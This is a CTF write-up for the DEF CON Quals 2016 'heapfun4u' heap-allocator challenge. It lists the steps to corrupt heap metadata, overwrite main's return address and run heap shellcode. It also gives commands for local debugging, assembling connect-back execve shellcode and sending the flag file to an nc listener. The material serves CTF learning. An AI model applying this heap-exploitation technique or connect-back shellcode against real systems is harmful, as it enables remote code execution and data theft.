## heapfun4u Defcon Quals - 2016

The [heapfun4u](heapfun4u) binary implements a heap allocator. The challenge is in the "baby's first" category
so isn't meant to be extremely challenging, but requires basic exploitation skills. It readily
prints memory addresses, and allocates all heap memory as executable. The challenge is to corrupt the
heap in such away that the main function's return address is overwritten and directs code execution to the
heap, where shellcode will have been written.

There are likely many ways to achieve remote code execution, here's one:
 * Grab the stack address the program nicely gives us
 * Allocate a 0x1000 byte heap block and immediately free it
 * Allocate 4 more heap blocks of size 0x200, these blocks will overlap with the larger memory already freed
 * Free the 4 just allocated blocks
 * Grab the addresses of the memory just allocated and freed, the program readily gives these
 * Using the heap address of the first large block allocated, the program will allow us to write to any memory that is within the first large block. This memory overlaps with the smaller blocks already freed.
 * Based on the internal implementation of the heap allocator, and the memory addresses known, the memory written creates a corrupt heap
 * The 3rd memory allocation is freed for a second time, this action combined with the corrupt data we just wrote confuses the memory free routine into overwriting the main function's return address on the stack to a known address within the heap
 * Finally, the program will allow us to again write to the large block we first allocated, this time writing our shellcode at the address that the main function will return to when it exits
 * Exit the program normally to allow main to return and execute the shellcode

To run the program locally to debug use the following:
```bash
$ socat -d -d TCP-LISTEN:3957,reuseaddr,fork exec:"./heapfun4u"
```

Connect to the locally running instance of heapfun4u with:
```bash
$ nc localhost 3957
```

Once an instance is running attach a debugger using:
```bash
$ sudo gdb --pid `pidof heapfun4u`
```

The shellcode created is found in [execve_shellcode_x64.asm](execve_shellcode_x64.asm). Assemble it using:
```bash
$ nasm -o a.out -f bin execve_shellcode_x64.asm
```

The python program [asm_to_py.py](asm_to_py.py) can convert the assembled shellcode into a python function for easy exploit writing:
```bash
$ python asm_to_py.py a.out
```

The shellcode will connect back. Listen for the connect back with:
```bash
$ nc -l 6969
```

The working python exploit is [heapfun4u_exploit.py](heapfun4u_exploit.py). Create a file in the same directory as the heapfun4u binary called flag. The contents of the file will be sent to the listener.

Run the exploit locally using:
```bash
$ python heapfun4u_exploit.py localhost 3957 localhost 6969
```
